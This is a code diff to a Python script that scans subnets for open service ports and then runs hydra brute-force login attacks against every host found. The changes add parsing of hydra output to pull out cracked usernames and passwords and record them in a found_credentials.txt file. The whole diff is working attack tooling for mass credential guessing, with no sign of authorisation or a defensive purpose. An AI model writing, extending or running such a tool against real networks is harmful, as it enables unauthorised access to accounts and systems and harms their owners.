@@ -3,6 +3,19 @@ import sys
 import argparse
 import os
 
+def parse_hydra_output(output):
+    """
+    Parses hydra output to extract successful login credentials.
+    Returns a tuple (success, username, password, host) if successful, otherwise (None, None, None, None).
+    """
+    lines = output.splitlines()
+    for line in lines:
+        if "login:" in line.lower() and "password:" in line.lower():
+            parts = line.split()
+            if len(parts) >= 7:
+                return True, parts[4], parts[6], parts[1]
+    return False, None, None, None
+
 def scan_subnets(subnet_list, service):
     open_hosts = []
     port_mapping = {
@@ -42,10 +55,9 @@ def scan_subnets(subnet_list, service):
                         parts = line.split()
                         ip = parts[1]
                         f.write(ip + '\n')
+                        open_hosts.append(ip)  # Store IP in list as well
 
-        # Read IPs from the temporary file
-        with open(ip_file, 'r') as f:
-            open_hosts = [line.strip() for line in f]
+        # No need to read IPs from the temporary file anymore
 
     except Exception as e:
         print(f"Error scanning subnets: {e}")
@@ -58,31 +70,46 @@ def scan_subnets(subnet_list, service):
     return open_hosts
 
 def run_hydra(open_hosts, usernames, passwords, service):
-    for host in open_hosts:
-        print(f"Bruteforcing {host} with {service}...")
-
-        # Prepare command for hydra
-        command = ['hydra', '-t', '4']
-
-        if usernames.endswith('.txt'):
-            command += ['-L', usernames]
-        else:
-            command += ['-l', usernames]
-
-        if passwords.endswith('.txt'):
-            command += ['-P', passwords]
-        else:
-            command += ['-p', passwords]
-
-        if service == 'ftp':
-            command += ['-e', 'n']  # Try anonymous FTP
-        
-        command += [f'{service}://{host}']
-
-        try:
-            subprocess.run(command, check=True)
-        except subprocess.CalledProcessError as e:
-            print(f"Error running hydra: {e}")
+    found_credentials_file = 'found_credentials.txt'
+    
+    try:
+        with open(found_credentials_file, 'w') as output_file:
+            for host in open_hosts:
+                print(f"Bruteforcing {host} with {service}...")
+    
+                # Prepare command for hydra
+                command = ['hydra', '-t', '4']
+    
+                if usernames.endswith('.txt'):
+                    command += ['-L', usernames]
+                else:
+                    command += ['-l', usernames]
+    
+                if passwords.endswith('.txt'):
+                    command += ['-P', passwords]
+                else:
+                    command += ['-p', passwords]
+    
+                if service == 'ftp':
+                    command += ['-e', 'n']  # Try anonymous FTP
+                
+                command += [f'{service}://{host}']
+    
+                try:
+                    result = subprocess.run(command, capture_output=True, text=True)
+                    if result.returncode == 0:
+                        success, username, password, _ = parse_hydra_output(result.stdout)
+                        if success:
+                            output_file.write(f"Successful brute-force on {service}://{host} with {username}:{password}\n")
+                        else:
+                            output_file.write(f"No valid credentials found for {service}://{host}\n")
+                    else:
+                        output_file.write(f"Failed to brute-force {service}://{host} with {usernames}:{passwords}\n")
+                except subprocess.CalledProcessError as e:
+                    output_file.write(f"Error running hydra on {service}://{host}: {e}\n")
+    
+    except Exception as e:
+        print(f"Error writing found credentials to file: {e}")
 
 def main():
     parser = argparse.ArgumentParser(description="Scan subnets and brute force services.")
